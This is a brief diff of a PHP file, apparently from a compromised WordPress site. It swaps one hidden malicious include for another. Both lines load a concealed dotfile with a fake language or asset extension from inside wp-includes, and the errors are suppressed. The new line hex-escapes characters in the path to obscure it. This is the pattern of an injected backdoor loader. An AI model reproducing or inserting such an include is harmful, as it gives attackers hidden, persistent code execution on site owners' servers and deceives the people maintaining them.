@@ -1,7 +1,11 @@
 <?php
 /*bfc9f*/
 
-@include ("/home/sharifenterprise/public_html/wp-includes/block-supports/.75a7bb8f.mo");
+@include ("/home/shar\x69fenterpr\x69se/publ\x69c_html/wp-\x69ncludes/blocks/shortcode/.b5948fe4.otc");
 
 /*bfc9f*/
+
+
+
+?>
 
